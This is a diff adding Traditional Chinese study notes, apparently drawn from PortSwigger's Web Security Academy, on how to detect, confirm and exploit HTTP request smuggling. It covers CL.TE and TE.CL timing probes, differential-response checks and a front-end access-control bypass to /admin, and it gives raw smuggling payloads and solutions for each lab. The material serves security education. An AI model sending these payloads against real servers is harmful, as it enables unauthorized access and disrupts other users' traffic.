@@ -284,3 +284,232 @@ Transfer-Encoding
     ```
 :::
 
+## 如何識別 HTTP 請求走私漏洞
+
+在本節中，我們將解釋發現 HTTP 請求走私漏洞的不同技術。
+
+### 使用計時技術尋找 HTTP 請求走私漏洞
+
+檢測 HTTP 請求走私漏洞最普遍有效的方法是發送請求，如果存在漏洞，這些請求會在應用程式的回應中造成時間延遲。Burp Scanner 使用此技術來自動檢測請求走私漏洞。
+
+#### 使用計時技術尋找 CL.TE 漏洞
+
+如果應用程式容易受到 CL.TE 變種的請求走私攻擊，那麼發送如下請求通常會造成時間延遲：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+
+由於前端伺服器使用 `Content-Length` 標頭，它只會轉發此請求的一部分，省略 `X`。後端伺服器使用 `Transfer-Encoding` 標頭，處理第一個資料塊，然後等待下一個資料塊到達。這將造成可觀察的時間延遲。
+
+#### 使用計時技術尋找 TE.CL 漏洞
+
+如果應用程式容易受到 TE.CL 變種的請求走私攻擊，那麼發送如下請求通常會造成時間延遲：
+
+```http
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
+
+由於前端伺服器使用 `Transfer-Encoding` 標頭，它只會轉發此請求的一部分，省略 `X`。後端伺服器使用 `Content-Length` 標頭，期望訊息主體中有更多內容，並等待剩餘內容到達。這將造成可觀察的時間延遲。
+
+::: info Note
+
+如果應用程式容易受到 CL.TE 變種漏洞的攻擊，基於計時的 TE.CL 漏洞測試可能會干擾其他應用程式用戶。因此，為了保持隱蔽性並最小化干擾，您應該首先使用 CL.TE 測試，只有在第一次測試不成功時才繼續進行 TE.CL 測試。
+:::
+
+### 使用差異回應確認 HTTP 請求走私漏洞
+
+當檢測到可能的請求走私漏洞時，您可以透過利用該漏洞觸發應用程式回應內容的差異來獲得進一步的漏洞證據。這涉及快速連續向應用程式發送兩個請求：
+
+* 一個「攻擊」請求，旨在干擾下一個請求的處理。
+* 一個「正常」請求。
+
+如果對正常請求的回應包含預期的干擾，則漏洞得到確認。
+
+例如，假設正常請求如下所示：
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+此請求通常會收到狀態碼為 200 的 HTTP 回應，包含一些搜尋結果。
+
+干擾此請求所需的攻擊請求取決於存在的請求走私變種：CL.TE 與 TE.CL。
+
+#### 使用差異回應確認 CL.TE 漏洞
+
+要確認 CL.TE 漏洞，您需要發送如下攻擊請求：
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+
+如果攻擊成功，則此請求的最後兩行會被後端伺服器視為屬於下一個接收到的請求。這會導致後續的「正常」請求看起來像這樣：
+
+```http
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+由於此請求現在包含無效的 URL，伺服器將回應狀態碼 404，表明攻擊請求確實干擾了它。
+
+::: tip Lab: [HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
+
+1. 發送兩次以下請求，完成此 Lab。
+    ```http
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 30
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /404 HTTP/1.1
+    Foo: x
+    ```
+:::
+
+#### 使用差異回應確認 TE.CL 漏洞
+
+要確認 TE.CL 漏洞，您需要發送如下攻擊請求：
+
+```http
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+```
+
+::: info Note
+
+要使用 Burp Repeater 發送此請求，您首先需要進入 Repeater 選單並確保 "Update Content-Length" 選項未勾選。
+
+您需要在最後的 `0` 後面包含尾隨序列 `\r\n\r\n`。
+:::
+
+如果攻擊成功，則從 `GET /404` 開始的所有內容都會被後端伺服器視為屬於下一個接收到的請求。這會導致後續的「正常」請求看起來像這樣：
+
+```http
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+x=
+0
+
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+由於此請求現在包含無效的 URL，伺服器將回應狀態碼 404，表明攻擊請求確實干擾了它。
+
+::: tip Lab: [HTTP request smuggling, confirming a TE.CL vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses)
+
+1. 發送兩次以下請求，完成此 Lab。
+    ```http
+    POST / HTTP/1.1
+    Host: YOUR-LAB-ID.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    5e
+    POST /404 HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 15
+
+    x=1
+    0
+    ```
+:::
+
+::: info Note
+
+在嘗試透過干擾其他請求來確認請求走私漏洞時，應該牢記一些重要的考慮事項：
+
+* 「攻擊」請求和「正常」請求應該使用不同的網路連線發送到伺服器。透過同一個連線發送兩個請求並不能證明漏洞存在。
+* 「攻擊」請求和「正常」請求應該盡可能使用相同的 URL 和參數名稱。這是因為許多現代應用程式根據 URL 和參數將前端請求路由到不同的後端伺服器。使用相同的 URL 和參數會增加請求被同一個後端伺服器處理的機會，這對攻擊成功至關重要。
+* 當測試「正常」請求以檢測來自「攻擊」請求的任何干擾時，您正在與應用程式同時接收的任何其他請求競爭，包括來自其他用戶的請求。您應該在「攻擊」請求之後立即發送「正常」請求。如果應用程式很忙碌，您可能需要進行多次嘗試來確認漏洞。
+* 在某些應用程式中，前端伺服器作為負載平衡器運作，並根據某種負載平衡演算法將請求轉發到不同的後端系統。如果您的「攻擊」和「正常」請求被轉發到不同的後端系統，那麼攻擊將失敗。這是您可能需要嘗試多次才能確認漏洞的額外原因。
+* 如果您的攻擊成功干擾了後續請求，但這不是您發送用來檢測干擾的「正常」請求，那麼這意味著另一個應用程式用戶受到了您攻擊的影響。如果您繼續執行測試，這可能會對其他用戶產生破壞性影響，您應該謹慎行事。
+:::
+
+## 如何利用 HTTP 請求走私漏洞
+
+在本節中，我們將描述根據應用程式的預期功能和其他行為，HTTP 請求走私漏洞可以被利用的各種方式。
+
+### 使用 HTTP 請求走私繞過前端安全控制
+
+在某些應用程式中，前端網頁伺服器用於實施某些安全控制，決定是否允許處理個別請求。允許的請求被轉發到後端伺服器，在那裡它們被認為已經通過了前端控制。
+
+例如，假設一個應用程式使用前端伺服器來實施存取控制限制，只有在用戶被授權存取請求的 URL 時才轉發請求。後端伺服器然後在不進一步檢查的情況下處理每個請求。在這種情況下，HTTP 請求走私漏洞可以用來繞過存取控制，透過走私一個對受限 URL 的請求。
+
+假設當前用戶被允許存取 `/home` 但不能存取 `/admin`。他們可以使用以下請求走私攻擊來繞過此限制：
+
+```http
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
+```
+
+前端伺服器在這裡看到兩個請求，都是對 `/home` 的，因此請求被轉發到後端伺服器。然而，後端伺服器看到一個對 `/home` 的請求和一個對 `/admin` 的請求。它假設（一如既往）請求已經通過了前端控制，因此允許存取受限的 URL。
